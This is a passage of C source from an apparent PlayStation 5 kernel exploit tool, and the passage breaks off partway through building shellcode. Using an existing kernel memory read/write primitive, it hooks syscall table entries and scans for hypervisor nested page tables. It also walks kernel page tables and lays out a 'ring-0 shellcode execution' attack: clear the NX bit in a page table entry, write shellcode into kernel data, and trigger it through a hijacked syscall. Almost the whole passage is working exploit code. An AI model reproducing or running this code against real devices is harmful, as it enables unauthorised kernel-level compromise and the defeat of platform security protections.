                    {4, "write"}, {5, "open"}, {6, "close"},
                    {20, "getpid"}, {37, "kill"}, {54, "ioctl"},
                    {59, "execve"}, {73, "munmap"}, {74, "mprotect"},
                    {165, "sysarch"}, {202, "sysctl"},
                    {304, "kldload"}, {305, "kldunload"}, {308, "kldstat"},
                    {477, "mmap"}, {337, "kldsym"},
                };
                for (unsigned i = 0; i < sizeof(key_syscalls)/sizeof(key_syscalls[0]); i++) {
                    int num = key_syscalls[i].num;
                    uint64_t ent_kva = sysent_kva + (uint64_t)num * SYSENT_STRIDE;
                    uint64_t ent_pa = va_to_pa_quiet(ent_kva);
                    uint8_t entry[SYSENT_STRIDE];
                    int32_t narg = -1;
                    uint64_t sy_call = 0;
                    if (ent_pa) {
                        kernel_copyout(g_dmap_base + ent_pa, entry, SYSENT_STRIDE);
                        memcpy(&narg, entry, 4);
                        memcpy(&sy_call, entry + 8, 8);
                    }
                    printf("    [%3d] %-12s narg=%d  sy_call=0x%lx (ktext+0x%lx)\n",
                           num, key_syscalls[i].name, narg,
                           (unsigned long)sy_call,
                           (unsigned long)(sy_call - g_ktext_base));
                }
            }
            fflush(stdout);
        }

        /* 4d-5: Sysent verification and live hook test */
        if (sysent_found) {
            printf("\n[*] Verifying sysent table...\n");
            fflush(stdout);

            /* Get nosys handler address (entry 0) */
            uint64_t nosys_call = 0;
            {
                uint64_t pa = va_to_pa_quiet(sysent_kva + 8);
                if (pa) kernel_copyout(g_dmap_base + pa, &nosys_call, 8);
            }

            /* Cross-check narg values for known syscalls */
            static const struct { int num; int narg; const char *name; } verify[] = {
                {20, 0, "getpid"}, {37, 2, "kill"}, {54, 3, "ioctl"},
                {59, 3, "execve"}, {73, 2, "munmap"}, {74, 3, "mprotect"},
                {165, 2, "sysarch"}, {202, 6, "sysctl"}, {477, 6, "mmap"},
                {304, 1, "kldload"}, {305, 1, "kldunload"}, {308, 2, "kldstat"},
            };
            int narg_ok = 0, narg_total = 0;
            for (unsigned i = 0; i < sizeof(verify)/sizeof(verify[0]); i++) {
                uint64_t ent_kva = sysent_kva + (uint64_t)verify[i].num * SYSENT_STRIDE;
                uint64_t pa = va_to_pa_quiet(ent_kva);
                if (!pa) continue;
                int32_t narg;
                kernel_copyout(g_dmap_base + pa, &narg, 4);
                narg_total++;
                if (narg == verify[i].narg) narg_ok++;
                else printf("    MISMATCH: %s narg=%d expected=%d\n",
                            verify[i].name, narg, verify[i].narg);
            }
            printf("    narg cross-check: %d/%d matched\n", narg_ok, narg_total);

            /* Count nosys entries in high range (600-723) */
            int nosys_cnt = 0, checked = 0;
            for (int i = 600; i < 724; i++) {
                uint64_t pa = va_to_pa_quiet(sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
                if (!pa) continue;
                uint64_t call;
                kernel_copyout(g_dmap_base + pa, &call, 8);
                checked++;
                if (call == nosys_call) nosys_cnt++;
            }
            printf("    nosys consistency: %d/%d high entries point to nosys (0x%lx)\n",
                   nosys_cnt, checked, (unsigned long)nosys_call);

            /* 12/12 narg match is strong proof. PS5 has ~117 custom Sony
             * syscalls in 600-723, so nosys count is just informational. */
            sysent_verified = (narg_ok == narg_total && narg_total >= 10);
            if (sysent_verified) {
                printf("[+] Sysent table VERIFIED (12/12 narg match)!\n");
                /* Export to globals for Phase 9 ring-0 arm+trigger */
            } else
                printf("[-] Sysent verification failed (%d/%d narg).\n",
                       narg_ok, narg_total);
            fflush(stdout);

            /* Live hook test: redirect an unused syscall to getpid handler */
            if (sysent_verified) {
                /* Find an unused (nosys) syscall — scan wide range */
                int test_sc = -1;
                for (int i = 723; i >= 500; i--) {
                    uint64_t pa = va_to_pa_quiet(
                        sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
                    if (!pa) continue;
                    uint64_t call;
                    kernel_copyout(g_dmap_base + pa, &call, 8);
                    if (call == nosys_call) { test_sc = i; break; }
                }

                if (test_sc >= 0) {
                    printf("\n[*] Live sysent hook test: syscall %d\n", test_sc);

                    uint64_t ent_kva = sysent_kva + (uint64_t)test_sc * SYSENT_STRIDE;

                    /* Save original entry */
                    uint8_t orig_ent[SYSENT_STRIDE];
                    uint64_t ent_pa = va_to_pa_quiet(ent_kva);
                    kernel_copyout(g_dmap_base + ent_pa, orig_ent, SYSENT_STRIDE);

                    /* Read & display original sy_call */
                    uint64_t orig_call = 0;
                    uint64_t call_pa = va_to_pa_quiet(ent_kva + 8);
                    kernel_copyout(g_dmap_base + call_pa, &orig_call, 8);
                    printf("    Original sy_call: 0x%lx (nosys=0x%lx, match=%s)\n",
                           (unsigned long)orig_call, (unsigned long)nosys_call,
                           orig_call == nosys_call ? "YES" : "NO");

                    /* Call before modification */
                    errno = 0;
                    long ret0 = syscall(test_sc);
                    int err0 = errno;
                    printf("    Before: syscall(%d) = %ld, errno=%d (%s)\n",
                           test_sc, ret0, err0,
                           err0 == 78 ? "ENOSYS" : "other");

                    /* Get getpid sy_call address */
                    uint64_t getpid_pa = va_to_pa_quiet(
                        sysent_kva + 20ULL * SYSENT_STRIDE + 8);
                    uint64_t getpid_call = 0;
                    kernel_copyout(g_dmap_base + getpid_pa, &getpid_call, 8);
                    printf("    getpid sy_call: 0x%lx\n",
                           (unsigned long)getpid_call);

                    /* Write getpid handler into test syscall via DMAP */
                    kernel_copyin(&getpid_call, g_dmap_base + call_pa, 8);

                    /* Also set narg=0 to match getpid */
                    int32_t zero = 0;
                    uint64_t narg_pa = va_to_pa_quiet(ent_kva);
                    kernel_copyin(&zero, g_dmap_base + narg_pa, 4);

                    /* Read back to verify the DMAP write stuck */
                    uint64_t readback = 0;
                    kernel_copyout(g_dmap_base + call_pa, &readback, 8);
                    int write_ok = (readback == getpid_call);
                    printf("    DMAP write verify: wrote 0x%lx, read back 0x%lx [%s]\n",
                           (unsigned long)getpid_call, (unsigned long)readback,
                           write_ok ? "OK" : "MISMATCH");

                    /* Call after modification — should return our PID */
                    errno = 0;
                    long ret1 = syscall(test_sc);
                    int err1 = errno;
                    pid_t real_pid = getpid();
                    printf("    After:  syscall(%d) = %ld, errno=%d (real pid=%d)\n",
                           test_sc, ret1, err1, real_pid);

                    if (ret1 == real_pid && err1 == 0) {
                        printf("[+] SYSENT HOOK VERIFIED — full syscall dispatch control!\n");
                    } else if (write_ok && ret1 == ret0) {
                        /* Write succeeded but behavior unchanged —
                         * something else dispatches before sysent */
                        printf("[-] DMAP write verified but syscall behavior UNCHANGED.\n");
                        printf("    ret before=%ld, after=%ld (identical)\n", ret0, ret1);
                        printf("    etaHEN syscall wrapper likely intercepts before sysent.\n");
                        printf("[*] Investigating etaHEN dispatch path...\n");
                        fflush(stdout);

                        /* Dump the sysentvec structure for more context */
                        uint64_t sv_pa = va_to_pa_quiet(
                            g_kdata_base + 0x1401bb8ULL);
                        if (sv_pa) {
                            uint8_t sv_raw[64];
                            kernel_copyout(g_dmap_base + sv_pa, sv_raw, 64);
                            printf("    sysentvec[0..63]:\n      ");
                            for (int j = 0; j < 64; j++) {
                                printf("%02x ", sv_raw[j]);
                                if ((j & 15) == 15) printf("\n      ");
                            }
                            printf("\n");
                            /* sv_fixup is at offset 48 (syscall entry func ptr) */
                            uint64_t sv_fixup = 0;
                            memcpy(&sv_fixup, sv_raw + 48, 8);
                            printf("    sv_fixup (offset 48): 0x%lx",
                                   (unsigned long)sv_fixup);
                            if (sv_fixup >= g_ktext_base &&
                                sv_fixup < g_ktext_base + 0x2000000ULL)
                                printf(" (ktext+0x%lx)",
                                       (unsigned long)(sv_fixup - g_ktext_base));
                            printf("\n");
                        }

                        /* SAFE reverse test: hook a real but rarely-used syscall
                         * to getpid handler. If the result changes from its normal
                         * return value to our PID, sysent IS the dispatch table
                         * for standard syscalls.
                         *
                         * IMPORTANT: Do NOT hook getpid->nosys! That crashes the PS5
                         * because every kernel thread calling getpid() would hit nosys,
                         * causing cascading failures and a hard freeze.
                         *
                         * Using issetugid (syscall 253): returns 0 or 1 normally,
                         * narg=0. If hooked to getpid handler, should return our PID.
                         * Rarely called by kernel threads, so safe to modify briefly. */
                        printf("[*] Safe reverse test: hook sysent[253] (issetugid) to getpid...\n");
                        fflush(stdout);

                        /* Read original issetugid entry */
                        uint64_t issu_ent_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
                        uint64_t issu_call_pa = va_to_pa_quiet(issu_ent_kva + 8);
                        uint64_t issu_narg_pa = va_to_pa_quiet(issu_ent_kva);
                        uint64_t issu_orig_call = 0;
                        int32_t issu_orig_narg = 0;
                        if (issu_call_pa && issu_narg_pa) {
                            kernel_copyout(g_dmap_base + issu_call_pa, &issu_orig_call, 8);
                            kernel_copyout(g_dmap_base + issu_narg_pa, &issu_orig_narg, 4);
                        }
                        printf("    sysent[253] original: sy_call=0x%lx, narg=%d\n",
                               (unsigned long)issu_orig_call, issu_orig_narg);

                        if (!issu_call_pa || issu_orig_call == 0) {
                            printf("[-] Can't read sysent[253], skipping reverse test.\n");
                        } else {
                            /* Call issetugid before hook */
                            errno = 0;
                            long issu_before = syscall(253);
                            int issu_err0 = errno;
                            printf("    Before hook: issetugid()=%ld, errno=%d\n",
                                   issu_before, issu_err0);

                            /* Save full entry for restore */
                            uint8_t issu_orig_ent[SYSENT_STRIDE];
                            uint64_t issu_ent_pa = va_to_pa_quiet(issu_ent_kva);
                            kernel_copyout(g_dmap_base + issu_ent_pa,
                                           issu_orig_ent, SYSENT_STRIDE);

                            /* Write getpid handler into issetugid */
                            kernel_copyin(&getpid_call, g_dmap_base + issu_call_pa, 8);
                            /* Set narg=0 to match getpid */
                            int32_t zero_narg = 0;
                            kernel_copyin(&zero_narg, g_dmap_base + issu_narg_pa, 4);

                            /* Verify write */
                            uint64_t issu_rb = 0;
                            kernel_copyout(g_dmap_base + issu_call_pa, &issu_rb, 8);
                            printf("    After write: sy_call=0x%lx (%s)\n",
                                   (unsigned long)issu_rb,
                                   issu_rb == getpid_call ? "OK" : "MISMATCH");

                            /* Call issetugid after hook — should return PID */
                            errno = 0;
                            long issu_after = syscall(253);
                            int issu_err1 = errno;
                            printf("    After hook:  issetugid()=%ld, errno=%d (pid=%d)\n",
                                   issu_after, issu_err1, real_pid);

                            /* Restore IMMEDIATELY */
                            kernel_copyin(issu_orig_ent,
                                          g_dmap_base + issu_ent_pa, SYSENT_STRIDE);
                            printf("    Restored sysent[253]\n");

                            if (issu_after == (long)real_pid && issu_err1 == 0) {
                                printf("[+] SYSENT HOOK CONFIRMED for standard syscalls!\n");
                                printf("    Kernel dispatches real syscalls through sysent.\n");
                                printf("    etaHEN only intercepts high/custom syscalls.\n");
                                printf("    This means: hook any standard sysent entry\n");
                                printf("    → execution redirected to chosen kernel function.\n");
                            } else if (issu_after == issu_before &&
                                       issu_err1 == issu_err0) {
                                printf("[-] issetugid unchanged — etaHEN intercepts all.\n");
                            } else {
                                printf("[?] Unexpected: before=%ld, after=%ld\n",
                                       issu_before, issu_after);
                                printf("    Partial sysent dispatch? Needs investigation.\n");
                            }
                        }
                    } else if (!write_ok) {
                        printf("[-] DMAP write FAILED — sysent page is write-protected.\n");
                    } else {
                        printf("[-] Sysent hook result unexpected: ret=%ld, errno=%d\n",
                               ret1, err1);
                        printf("    Write verified OK but behavior unclear.\n");
                    }

                    /* Restore original entry */
                    kernel_copyin(orig_ent, g_dmap_base + ent_pa, SYSENT_STRIDE);
                    printf("    Restored sysent[%d]\n", test_sc);
                    fflush(stdout);
                } else {
                    printf("[-] No unused nosys syscall found in 500-723.\n");
                }
            }
        }

        /* ================================================================
         * NPT (Nested Page Table) Discovery Scan
         * ================================================================
         * Goal: Find the PS5 hypervisor's page table structures that
         * enforce W^X on kernel memory.  Entirely read-only via DMAP.
         *
         * Strategy:
         *   1. Scan guest physical memory for VMCB (contains nCR3 = NPT root)
         *      - VMCB has guest CR3 at save-state offset 0x580
         *   2. Scan for page table pages referencing known kdata/ktext PAs
         *   3. Map out which PA ranges are guest-accessible vs HV-protected
         *
         * AMD NPT entry format (8 bytes):
         *   Bit 0:     Present
         *   Bit 1:     Read/Write
         *   Bit 2:     User/Supervisor
         *   Bit 7:     Page Size (2MB at PD level)
         *   Bits 12-51: Physical page frame number
         *   Bit 63:    NX (No Execute)
         * ================================================================ */
        {
            printf("\n=============================================\n");
            printf("  NPT Discovery: HV Page Table Scan\n");
            printf("=============================================\n\n");
            fflush(stdout);

            /* Get known physical addresses for signature matching */
            uint64_t ktext_pa = va_to_pa_quiet(g_ktext_base);
            uint64_t kdata_pa = va_to_pa_quiet(g_kdata_base);
            uint64_t ktext_2mb = ktext_pa & ~0x1FFFFFULL;
            uint64_t kdata_2mb = kdata_pa & ~0x1FFFFFULL;

            printf("[*] Search signatures:\n");
            printf("    ktext PA  = 0x%lx (2MB page: 0x%lx)\n",
                   (unsigned long)ktext_pa, (unsigned long)ktext_2mb);
            printf("    kdata PA  = 0x%lx (2MB page: 0x%lx)\n",
                   (unsigned long)kdata_pa, (unsigned long)kdata_2mb);
            printf("    Guest CR3 = 0x%lx\n", (unsigned long)g_cr3_phys);
            printf("    Scan range: PA 0x0 → 0x20000000 (512MB)\n");
            fflush(stdout);

            uint8_t scan_pg[4096];
            int npt_ok = 0, npt_fail = 0;
            int vmcb_found = 0;
            int pt_pages_with_refs = 0;
            /* Track which 2MB regions are accessible vs blocked */
            int accessible_2mb = 0, blocked_2mb = 0;
            uint64_t first_blocked = 0, last_blocked = 0;

            /* Phase 1: Scan for VMCB and PT structures */
            for (uint64_t pa = 0; pa < 0x20000000ULL; pa += 0x1000) {
                /* Progress every 64MB */
                if ((pa & 0x3FFFFFF) == 0 && pa > 0) {
                    printf("    Scan: %luMB/512MB (%d OK, %d blocked, "
                           "%d PT refs found)\n",
                           (unsigned long)(pa >> 20), npt_ok, npt_fail,
                           pt_pages_with_refs);
                    fflush(stdout);
                }

                /* Track 2MB-region accessibility */
                if ((pa & 0x1FFFFF) == 0) {
                    /* Test first page of each 2MB region */
                    if (kernel_copyout(g_dmap_base + pa, scan_pg, 8) != 0) {
                        blocked_2mb++;
                        if (!first_blocked) first_blocked = pa;
                        last_blocked = pa;
                        pa += 0x1FFFFF; /* Skip rest of blocked 2MB region */
                        npt_fail += 512;
                        continue;
                    }
                    accessible_2mb++;
                }

                if (kernel_copyout(g_dmap_base + pa, scan_pg, 4096) != 0) {
                    npt_fail++;
                    continue;
                }
                npt_ok++;

                uint64_t *ents = (uint64_t *)scan_pg;

                /* Check for VMCB: guest CR3 at save-state offset 0x580 */
                if (g_cr3_phys != 0) {
                    uint64_t v580 = 0;
                    memcpy(&v580, scan_pg + 0x580, 8);
                    /* CR3 match (mask out PCID bits in low 12) */
                    if ((v580 & ~0xFFFULL) == (g_cr3_phys & ~0xFFFULL) &&
                        v580 != 0) {
                        printf("\n[!] VMCB candidate at PA 0x%lx!\n",
                               (unsigned long)pa);
                        printf("    offset 0x580 (CR3): 0x%lx\n",
                               (unsigned long)v580);
                        vmcb_found++;

                        /* Dump likely nCR3 locations in control area */
                        printf("    Control area (possible nCR3):\n");
                        for (int off = 0x40; off <= 0xB0; off += 8) {
                            uint64_t val;
                            memcpy(&val, scan_pg + off, 8);
                            /* nCR3 should be page-aligned, non-zero,
                             * reasonable PA */
                            if (val != 0 && (val & 0xFFF) == 0 &&
                                val < 0x800000000ULL) {
                                printf("      [0x%03x] = 0x%lx", off,
                                       (unsigned long)val);
                                /* Try to read the page it points to */
                                uint8_t probe[8];
                                if (kernel_copyout(g_dmap_base + val,
                                                   probe, 8) == 0) {
                                    uint64_t first_e;
                                    memcpy(&first_e, probe, 8);
                                    printf(" (readable, first entry:"
                                           " 0x%lx)", (unsigned long)first_e);
                                } else {
                                    printf(" (NOT readable from guest)");
                                }
                                printf("\n");
                            }
                        }
                        /* Also dump some save-state area for context */
                        printf("    Save state context:\n");
                        /* CR0 at 0x588, CR4 at 0x578, EFER at 0x550 */
                        uint64_t v_cr0, v_cr4, v_efer;
                        memcpy(&v_efer, scan_pg + 0x550, 8);
                        memcpy(&v_cr4, scan_pg + 0x578, 8);
                        memcpy(&v_cr0, scan_pg + 0x588, 8);
                        printf("      EFER(0x550)=0x%lx CR4(0x578)=0x%lx"
                               " CR0(0x588)=0x%lx\n",
                               (unsigned long)v_efer, (unsigned long)v_cr4,
                               (unsigned long)v_cr0);
                        fflush(stdout);
                    }
                }

                /* Check if this page has PT entries referencing
                 * kdata or ktext physical addresses */
                int kdata_refs = 0, ktext_refs = 0;
                int present_cnt = 0;
                for (int i = 0; i < 512; i++) {
                    uint64_t e = ents[i];
                    if (!(e & 1)) continue;
                    present_cnt++;

                    uint64_t e_pa = e & 0x000FFFFFFFFFF000ULL;
                    int is_2mb = (e & 0x80) != 0;

                    if (is_2mb) {
                        uint64_t e_2mb = e_pa & ~0x1FFFFFULL;
                        if (e_2mb == kdata_2mb) kdata_refs++;
                        if (e_2mb == ktext_2mb) ktext_refs++;
                    } else {
                        /* 4KB entry or PT pointer — check if PA is in
                         * kdata/ktext range (within 32MB) */
                        if (e_pa >= kdata_pa &&
                            e_pa < kdata_pa + 0x2000000)
                            kdata_refs++;
                        if (e_pa >= ktext_pa &&
                            e_pa < ktext_pa + 0x2000000)
                            ktext_refs++;
                    }
                }

                if (kdata_refs > 0 || ktext_refs > 0) {
                    pt_pages_with_refs++;
                    printf("\n[!] PT page at PA 0x%lx: %d present entries, "
                           "%d kdata refs, %d ktext refs\n",
                           (unsigned long)pa, present_cnt,
                           kdata_refs, ktext_refs);

                    /* Dump matching entries */
                    for (int i = 0; i < 512; i++) {
                        uint64_t e = ents[i];
                        if (!(e & 1)) continue;
                        uint64_t e_pa = e & 0x000FFFFFFFFFF000ULL;
                        int is_2mb = (e & 0x80) != 0;
                        int match = 0;
                        if (is_2mb) {
                            uint64_t e_2mb = e_pa & ~0x1FFFFFULL;
                            if (e_2mb == kdata_2mb ||
                                e_2mb == ktext_2mb) match = 1;
                        } else {
                            if ((e_pa >= kdata_pa &&
                                 e_pa < kdata_pa + 0x2000000) ||
                                (e_pa >= ktext_pa &&
                                 e_pa < ktext_pa + 0x2000000))
                                match = 1;
                        }
                        if (match) {
                            printf("    [%3d] 0x%016lx → PA=0x%lx "
                                   "%s %s %s %s\n",
                                   i, (unsigned long)e, (unsigned long)e_pa,
                                   is_2mb ? "2MB" : "4KB",
                                   (e & 2) ? "RW" : "RO",
                                   (e & 4) ? "User" : "Kern",
                                   (e >> 63) ? "NX" : "X");
                        }
                    }
                    fflush(stdout);
                }
            }

            printf("\n[*] NPT scan summary:\n");
            printf("    Pages scanned:   %d OK, %d blocked\n",
                   npt_ok, npt_fail);
            printf("    2MB regions:     %d accessible, %d blocked\n",
                   accessible_2mb, blocked_2mb);
            if (first_blocked)
                printf("    Blocked range:   first=0x%lx, last=0x%lx\n",
                       (unsigned long)first_blocked,
                       (unsigned long)last_blocked);
            printf("    VMCB candidates: %d\n", vmcb_found);
            printf("    PT pages w/ kdata/ktext refs: %d\n",
                   pt_pages_with_refs);

            if (vmcb_found == 0 && pt_pages_with_refs == 0) {
                printf("\n[*] HV structures not found in guest-accessible memory.\n");
                printf("    The hypervisor likely protects its page tables.\n");
                printf("    Alternative: use sysent hook to call kernel pmap\n");
                printf("    functions (e.g. pmap_protect) from ring 0 to\n");
                printf("    change page permissions from inside the kernel.\n");
            }
            printf("\n");
            fflush(stdout);

            /* ── Guest Page Table Walk: check where NX is enforced ──
             *
             * The NPT scan found identity-mapping PD tables at PA 0x6a000
             * and 0x6e000 where BOTH ktext and kdata are RW+X (no NX).
             * This means NX enforcement is likely in the guest page tables.
             *
             * Walk the guest PT (from CR3) for both kdata and ktext,
             * dumping entries at each level with full permission bits.
             * If NX is in the guest PTE, we can clear it via DMAP write. */
            printf("=============================================\n");
            printf("  Guest Page Table Walk: Permission Analysis\n");
            printf("=============================================\n\n");
            fflush(stdout);

            uint64_t walk_targets[] = {
                g_ktext_base,
                g_kdata_base,
                g_kdata_base + 0x1000, /* kdata + 1 page */
            };
            const char *walk_names[] = {
                "ktext_base",
                "kdata_base",
                "kdata+0x1000",
            };
            int n_walks = 3;

            for (int w = 0; w < n_walks; w++) {
                uint64_t va = walk_targets[w];
                printf("[*] Walking guest PT for %s (VA=0x%lx):\n",
                       walk_names[w], (unsigned long)va);

                int pml4_idx = (va >> 39) & 0x1FF;
                int pdp_idx  = (va >> 30) & 0x1FF;
                int pd_idx   = (va >> 21) & 0x1FF;
                int pt_idx   = (va >> 12) & 0x1FF;
                printf("    Indices: PML4[%d] PDP[%d] PD[%d] PT[%d]\n",
                       pml4_idx, pdp_idx, pd_idx, pt_idx);

                /* PML4E */
                uint64_t pml4e = 0;
                uint64_t pml4e_pa = g_cr3_phys + pml4_idx * 8;
                kernel_copyout(g_dmap_base + pml4e_pa, &pml4e, 8);
                printf("    PML4E: 0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pml4e, (unsigned long)pml4e_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " NX=%d → next PA=0x%lx\n",
                       (int)(pml4e & 1), (int)((pml4e >> 1) & 1),
                       (int)((pml4e >> 2) & 1), (int)((pml4e >> 3) & 1),
                       (int)((pml4e >> 4) & 1), (int)((pml4e >> 5) & 1),
                       (int)(pml4e >> 63),
                       (unsigned long)(pml4e & PTE_PA_MASK));
                if (!(pml4e & PTE_PRESENT)) {
                    printf("    [STOP] PML4E not present.\n\n");
                    continue;
                }

                /* PDPE */
                uint64_t pdpe = 0;
                uint64_t pdpe_pa = (pml4e & PTE_PA_MASK) + pdp_idx * 8;
                kernel_copyout(g_dmap_base + pdpe_pa, &pdpe, 8);
                printf("    PDPE:  0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pdpe, (unsigned long)pdpe_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " PS=%d NX=%d → next PA=0x%lx\n",
                       (int)(pdpe & 1), (int)((pdpe >> 1) & 1),
                       (int)((pdpe >> 2) & 1), (int)((pdpe >> 3) & 1),
                       (int)((pdpe >> 4) & 1), (int)((pdpe >> 5) & 1),
                       (int)((pdpe >> 7) & 1), (int)(pdpe >> 63),
                       (unsigned long)(pdpe & PTE_PA_MASK));
                if (!(pdpe & PTE_PRESENT)) {
                    printf("    [STOP] PDPE not present.\n\n");
                    continue;
                }
                if (pdpe & PTE_PS) {
                    printf("    [1GB page] Final PA=0x%lx\n\n",
                           (unsigned long)((pdpe & 0xFFFFC0000000ULL) |
                                           (va & 0x3FFFFFFF)));
                    continue;
                }

                /* PDE */
                uint64_t pde = 0;
                uint64_t pde_pa = (pdpe & PTE_PA_MASK) + pd_idx * 8;
                kernel_copyout(g_dmap_base + pde_pa, &pde, 8);
                printf("    PDE:   0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pde, (unsigned long)pde_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " D=%d PS=%d G=%d NX=%d → next PA=0x%lx\n",
                       (int)(pde & 1), (int)((pde >> 1) & 1),
                       (int)((pde >> 2) & 1), (int)((pde >> 3) & 1),
                       (int)((pde >> 4) & 1), (int)((pde >> 5) & 1),
                       (int)((pde >> 6) & 1), (int)((pde >> 7) & 1),
                       (int)((pde >> 8) & 1), (int)(pde >> 63),
                       (unsigned long)(pde & PTE_PA_MASK));
                if (!(pde & PTE_PRESENT)) {
                    printf("    [STOP] PDE not present.\n\n");
                    continue;
                }
                if (pde & PTE_PS) {
                    printf("    [2MB page] Final PA=0x%lx\n",
                           (unsigned long)((pde & 0xFFFFFFE00000ULL) |
                                           (va & 0x1FFFFF)));
                    printf("    >>> NX=%d RW=%d — this controls"
                           " execution permission\n\n",
                           (int)(pde >> 63), (int)((pde >> 1) & 1));
                    /* Report PDE physical address for potential mod */
                    printf("    PDE at PA 0x%lx — writable via DMAP"
                           " 0x%lx\n\n",
                           (unsigned long)pde_pa,
                           (unsigned long)(g_dmap_base + pde_pa));
                    continue;
                }

                /* PTE */
                uint64_t pte = 0;
                uint64_t pte_pa = (pde & PTE_PA_MASK) + pt_idx * 8;
                kernel_copyout(g_dmap_base + pte_pa, &pte, 8);
                printf("    PTE:   0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pte, (unsigned long)pte_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " D=%d PAT=%d G=%d NX=%d → PA=0x%lx\n",
                       (int)(pte & 1), (int)((pte >> 1) & 1),
                       (int)((pte >> 2) & 1), (int)((pte >> 3) & 1),
                       (int)((pte >> 4) & 1), (int)((pte >> 5) & 1),
                       (int)((pte >> 6) & 1), (int)((pte >> 7) & 1),
                       (int)((pte >> 8) & 1), (int)(pte >> 63),
                       (unsigned long)(pte & PTE_PA_MASK));
                if (!(pte & PTE_PRESENT)) {
                    printf("    [STOP] PTE not present.\n\n");
                    continue;
                }

                printf("    >>> NX=%d RW=%d — this controls"
                       " execution permission\n",
                       (int)(pte >> 63), (int)((pte >> 1) & 1));
                printf("    PTE at PA 0x%lx — writable via DMAP 0x%lx\n\n",
                       (unsigned long)pte_pa,
                       (unsigned long)(g_dmap_base + pte_pa));
            }
            fflush(stdout);
        }

        /* ================================================================
         * Ring-0 Shellcode Execution via Guest PTE NX-bit Clear
         * ================================================================
         *
         * PROVEN: NPT maps kdata as RW+X (no NX at PA 0x6a000/0x6e000).
         * PROVEN: Guest PTE for kdata has NX=1 (bit 63) — the ONLY barrier.
         * PROVEN: Sysent hooks redirect standard syscalls to any ktext addr.
         *
         * Attack plan:
         *   1. Write minimal shellcode to kdata code cave via DMAP
         *   2. Clear NX+G in the guest PTE via DMAP write
         *   3. Hook sysent[253] (issetugid) to point to shellcode
         *   4. Call syscall(253) → ring-0 execution!
         *   5. Restore PTE + sysent + code cave content
         *
         * TLB concern: PTE has A=0 → page likely not in TLB.
         * We clear G too so CR3 reloads will flush if cached.
         * ================================================================ */
        if (sysent_verified && sysent_kva != 0) {
            printf("=============================================\n");
            printf("  Ring-0 Execution: PTE NX-bit Clear Attack\n");
            printf("=============================================\n\n");
            fflush(stdout);

            /* Target: kdata_base (first page, known code cave) */
            uint64_t target_kva = g_kdata_base;
            uint64_t target_pa = va_to_pa_quiet(target_kva);

            /* Walk guest PT to find the PTE for target_kva */
            uint64_t walk_e;
            uint64_t walk_pa;
            /* PML4 → PDP → PD → PTE */
            walk_pa = g_cr3_phys + ((target_kva >> 39) & 0x1FF) * 8;
            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
            if (!(walk_e & PTE_PRESENT)) goto r0_skip;

            walk_pa = (walk_e & PTE_PA_MASK) +
                      ((target_kva >> 30) & 0x1FF) * 8;
            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
            if (walk_e & PTE_PS) {
                printf("[-] kdata mapped as 1GB page, not 4KB PTE.\n");
                goto r0_skip;
            }

            walk_pa = (walk_e & PTE_PA_MASK) +
                      ((target_kva >> 21) & 0x1FF) * 8;
            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
            /* Check for 2MB page — handle differently */
            uint64_t pte_pa;
            uint64_t orig_pte;
            int is_pde_2mb = (walk_e & PTE_PS) != 0;
            if (is_pde_2mb) {
                /* PDE is the final level (2MB page) */
                pte_pa = (walk_e & PTE_PA_MASK) +
                         ((target_kva >> 21) & 0x1FF) * 8;
                /* Re-read using the PDE address */
                pte_pa = walk_pa; /* walk_pa IS the PDE address */
                kernel_copyout(g_dmap_base + pte_pa, &orig_pte, 8);
                printf("[*] kdata mapped as 2MB page (PDE at PA 0x%lx)\n",
                       (unsigned long)pte_pa);
            } else {
                /* Walk to PT level */
                walk_pa = (walk_e & PTE_PA_MASK) +
                          ((target_kva >> 12) & 0x1FF) * 8;
                kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
                if (!(walk_e & PTE_PRESENT)) goto r0_skip;
                pte_pa = walk_pa;
                orig_pte = walk_e;
            }

            printf("[*] Target: kdata_base KVA=0x%lx PA=0x%lx\n",
                   (unsigned long)target_kva, (unsigned long)target_pa);
            printf("[*] PTE at PA 0x%lx: 0x%016lx\n",
                   (unsigned long)pte_pa, (unsigned long)orig_pte);
            printf("    NX=%d RW=%d G=%d A=%d\n",
                   (int)(orig_pte >> 63), (int)((orig_pte >> 1) & 1),
                   (int)((orig_pte >> 8) & 1), (int)((orig_pte >> 5) & 1));
            fflush(stdout);

            int nx_already_clear = !(orig_pte >> 63);
            if (nx_already_clear) {
                printf("[+] NX already clear — page is executable (expected after Phase 5b).\n");
                printf("    Proceeding with ring-0 execution test.\n");
            }

            /* Step 1: Save original kdata content and write shellcode.
             *
             * Shellcode (29 bytes):
             *   mov rax, <DMAP_KVA_of_shared_buf>  ; 10 bytes
             *   mov rdx, <magic>                    ; 10 bytes
             *   mov [rax], rdx                      ; 3 bytes
             *   xor eax, eax                        ; 2 bytes
             *   ret                                 ; 1 byte
             *
             * Writes 0xDEAD_RING_0000_0000 to shared buffer, returns 0.
             */
            uint8_t r0_shellcode[32];
            int sc_len = 0;
            uint64_t sc_magic = 0xDEAD000052494E47ULL; /* "RING" + marker */

            /* mov rax, imm64 */
            r0_shellcode[sc_len++] = 0x48;
            r0_shellcode[sc_len++] = 0xB8;
            memcpy(&r0_shellcode[sc_len], &result_kva, 8);
            sc_len += 8;

            /* mov rdx, imm64 */
            r0_shellcode[sc_len++] = 0x48;
            r0_shellcode[sc_len++] = 0xBA;
            memcpy(&r0_shellcode[sc_len], &sc_magic, 8);
            sc_len += 8;

            /* mov [rax], rdx */
            r0_shellcode[sc_len++] = 0x48;
            r0_shellcode[sc_len++] = 0x89;
